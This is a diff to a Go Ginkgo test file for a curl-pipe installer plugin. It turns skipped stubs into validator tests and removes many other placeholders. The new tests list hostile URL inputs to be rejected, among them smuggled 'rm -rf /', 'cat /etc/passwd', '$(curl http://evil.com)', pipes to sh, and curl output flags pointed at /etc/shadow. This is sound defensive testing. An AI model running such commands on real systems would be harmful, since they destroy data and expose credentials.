@@ -2,44 +2,109 @@ package main_test
 
 import (
 	. "github.com/onsi/ginkgo/v2"
-	_ "github.com/onsi/gomega"
+	. "github.com/onsi/gomega"
 
 	main "github.com/jameswlane/devex/packages/package-manager-curlpipe"
 )
 
 var _ = Describe("Curlpipe Security", func() {
-	var _ *main.CurlpipePlugin
+	var plugin *main.CurlpipePlugin
 
 	BeforeEach(func() {
-		_ = main.NewCurlpipePlugin()
+		plugin = main.NewCurlpipePlugin()
 	})
 
 	Describe("Command Injection Prevention", func() {
 		Context("URL-based injection attempts", func() {
 			It("should prevent injection via malicious URLs", func() {
-				Skip("Integration test - requires comprehensive injection testing")
+				maliciousURLs := []string{
+					"https://get.docker.com/install.sh; rm -rf /",
+					"https://get.docker.com/install.sh && whoami",
+					"https://get.docker.com/install.sh | sh",
+					"https://get.docker.com/`id`",
+					"https://get.docker.com/$(id)",
+					"-o/etc/shadow",
+					"--output=/etc/shadow",
+					"-k",
+				}
+				for _, u := range maliciousURLs {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred(), "URL should be rejected: %s", u)
+					err = plugin.ValidateScriptURL(u)
+					Expect(err).To(HaveOccurred(), "Script URL should be rejected: %s", u)
+				}
 			})
 
 			It("should prevent injection via URL parameters", func() {
-				Skip("Integration test - requires parameter injection testing")
+				badParamURLs := []string{
+					"https://get.docker.com/install.sh?v=1;cat /etc/passwd",
+					"https://get.docker.com/install.sh?v=$(cat /etc/passwd)",
+					"https://get.docker.com/install.sh?v=`reboot`",
+					"https://get.docker.com/install.sh?v=1&x=2|sh",
+				}
+				for _, u := range badParamURLs {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 
 			It("should prevent injection via URL fragments", func() {
-				Skip("Integration test - requires fragment injection testing")
+				badFragmentURLs := []string{
+					"https://get.docker.com/install.sh#;rm -rf /",
+					"https://get.docker.com/install.sh#`id`",
+					"https://get.docker.com/install.sh#$(id)",
+				}
+				for _, u := range badFragmentURLs {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 		})
 
 		Context("Shell injection prevention", func() {
 			It("should safely handle URLs with shell metacharacters", func() {
-				Skip("Integration test - requires shell injection testing")
+				dangerous := []string{
+					"https://get.docker.com/a;b",
+					"https://get.docker.com/a&&b",
+					"https://get.docker.com/a||b",
+					"https://get.docker.com/a|b",
+					"https://get.docker.com/a>b",
+					"https://get.docker.com/a<b",
+					"https://get.docker.com/a`b",
+					"https://get.docker.com/a$b",
+					"https://get.docker.com/a(b",
+					"https://get.docker.com/a)b",
+					"https://get.docker.com/a\\b",
+					"https://get.docker.com/a'b",
+					"https://get.docker.com/a\"b",
+				}
+				for _, u := range dangerous {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 
 			It("should prevent command substitution attacks", func() {
-				Skip("Integration test - requires command substitution testing")
+				substitutions := []string{
+					"https://get.docker.com/$(curl http://evil.com)",
+					"https://get.docker.com/`curl http://evil.com`",
+				}
+				for _, u := range substitutions {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 
 			It("should prevent pipe injection attacks", func() {
-				Skip("Integration test - requires pipe injection testing")
+				pipes := []string{
+					"https://get.docker.com/install.sh | bash",
+					"https://get.docker.com/install.sh|bash",
+					"https://get.docker.com/install.sh | sh",
+				}
+				for _, u := range pipes {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 		})
 	})
@@ -47,195 +112,48 @@ var _ = Describe("Curlpipe Security", func() {
 	Describe("Domain Validation Security", func() {
 		Context("trusted domain bypass attempts", func() {
 			It("should prevent subdomain spoofing", func() {
-				Skip("Integration test - requires subdomain validation testing")
-			})
-
-			It("should prevent IDN homograph attacks", func() {
-				Skip("Integration test - requires Unicode domain testing")
+				fakeDomains := []string{
+					"evil-get.docker.com",
+					"get.docker.com.attacker.com",
+					"attacker-github.com",
+				}
+				for _, d := range fakeDomains {
+					Expect(plugin.IsTrustedDomain(d)).To(BeFalse())
+				}
 			})
 
 			It("should prevent IP address bypasses", func() {
-				Skip("Integration test - requires IP address validation")
-			})
-		})
-
-		Context("domain name validation", func() {
-			It("should validate domain name format", func() {
-				Skip("Integration test - requires domain format validation")
-			})
-
-			It("should prevent DNS rebinding attacks", func() {
-				Skip("Integration test - requires DNS rebinding protection testing")
-			})
-		})
-	})
-
-	Describe("Script Content Validation", func() {
-		Context("malicious script detection", func() {
-			It("should detect obviously malicious commands", func() {
-				Skip("Integration test - requires script content analysis")
-			})
-
-			It("should detect obfuscated malicious content", func() {
-				Skip("Integration test - requires advanced content analysis")
-			})
-
-			It("should detect network exfiltration attempts", func() {
-				Skip("Integration test - requires network behavior analysis")
-			})
-		})
-
-		Context("script sanitization", func() {
-			It("should sanitize script output display", func() {
-				Skip("Integration test - requires output sanitization testing")
-			})
-
-			It("should prevent terminal escape sequence attacks", func() {
-				Skip("Integration test - requires terminal security testing")
+				ipURLs := []string{
+					"https://127.0.0.1/script.sh",
+					"https://localhost/script.sh",
+					"https://10.0.0.1/script.sh",
+					"https://192.168.1.1/script.sh",
+					"https://172.16.0.1/script.sh",
+				}
+				for _, u := range ipURLs {
+					err := plugin.ValidateScriptURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 		})
 	})
 
 	Describe("Network Security", func() {
 		Context("HTTPS enforcement", func() {
-			It("should prefer HTTPS over HTTP", func() {
-				Skip("Integration test - requires HTTPS preference testing")
-			})
+			It("should reject HTTP URLs and require HTTPS", func() {
+				httpURLs := []string{
+					"http://get.docker.com/install.sh",
+					"http://sh.rustup.rs",
+					"http://raw.githubusercontent.com/user/repo/main/install.sh",
+				}
+				for _, u := range httpURLs {
+					err := plugin.ValidateURL(u)
+					Expect(err).To(HaveOccurred())
+					Expect(err.Error()).To(ContainSubstring("only HTTPS URLs are allowed"))
 
-			It("should validate SSL certificates", func() {
-				Skip("Integration test - requires certificate validation")
-			})
-
-			It("should prevent downgrade attacks", func() {
-				Skip("Integration test - requires protocol downgrade testing")
-			})
-		})
-
-		Context("network isolation", func() {
-			It("should prevent internal network access", func() {
-				Skip("Integration test - requires network boundary testing")
-			})
-
-			It("should prevent localhost exploitation", func() {
-				Skip("Integration test - requires localhost protection testing")
-			})
-		})
-	})
-
-	Describe("File System Security", func() {
-		Context("path traversal prevention", func() {
-			It("should prevent directory traversal attacks", func() {
-				Skip("Integration test - requires path traversal testing")
-			})
-
-			It("should validate script paths safely", func() {
-				Skip("Integration test - requires path validation testing")
-			})
-		})
-
-		Context("file operation security", func() {
-			It("should safely handle temporary files", func() {
-				Skip("Integration test - requires temp file security testing")
-			})
-
-			It("should prevent symlink attacks", func() {
-				Skip("Integration test - requires symlink protection testing")
-			})
-		})
-	})
-
-	Describe("Input Sanitization", func() {
-		Context("user input handling", func() {
-			It("should sanitize all user-provided URLs", func() {
-				Skip("Integration test - requires input sanitization testing")
-			})
-
-			It("should sanitize command-line arguments", func() {
-				Skip("Integration test - requires argument sanitization testing")
-			})
-
-			It("should sanitize environment variables", func() {
-				Skip("Integration test - requires environment sanitization testing")
-			})
-		})
-
-		Context("output sanitization", func() {
-			It("should sanitize log output", func() {
-				Skip("Integration test - requires log sanitization testing")
-			})
-
-			It("should sanitize error messages", func() {
-				Skip("Integration test - requires error sanitization testing")
-			})
-		})
-	})
-
-	Describe("Privilege Escalation Prevention", func() {
-		Context("execution context", func() {
-			It("should not require elevated privileges", func() {
-				Skip("Integration test - requires privilege testing")
-			})
-
-			It("should drop privileges when possible", func() {
-				Skip("Integration test - requires privilege dropping testing")
-			})
-		})
-
-		Context("script execution", func() {
-			It("should execute scripts with limited privileges", func() {
-				Skip("Integration test - requires execution privilege testing")
-			})
-
-			It("should prevent sudo/su usage in scripts", func() {
-				Skip("Integration test - requires privilege escalation detection")
-			})
-		})
-	})
-
-	Describe("Rate Limiting and DoS Protection", func() {
-		Context("request rate limiting", func() {
-			It("should limit download request rate", func() {
-				Skip("Integration test - requires rate limiting testing")
-			})
-
-			It("should prevent resource exhaustion", func() {
-				Skip("Integration test - requires resource exhaustion testing")
-			})
-		})
-
-		Context("resource consumption", func() {
-			It("should limit memory usage", func() {
-				Skip("Integration test - requires memory limit testing")
-			})
-
-			It("should limit script execution time", func() {
-				Skip("Integration test - requires timeout testing")
-			})
-		})
-	})
-
-	Describe("Audit and Logging", func() {
-		Context("security event logging", func() {
-			It("should log all script executions", func() {
-				Skip("Integration test - requires audit logging testing")
-			})
-
-			It("should log security violations", func() {
-				Skip("Integration test - requires security logging testing")
-			})
-
-			It("should log failed validation attempts", func() {
-				Skip("Integration test - requires failure logging testing")
-			})
-		})
-
-		Context("log security", func() {
-			It("should prevent log injection", func() {
-				Skip("Integration test - requires log injection testing")
-			})
-
-			It("should sanitize log entries", func() {
-				Skip("Integration test - requires log sanitization testing")
+					err = plugin.ValidateScriptURL(u)
+					Expect(err).To(HaveOccurred())
+				}
 			})
 		})
 	})
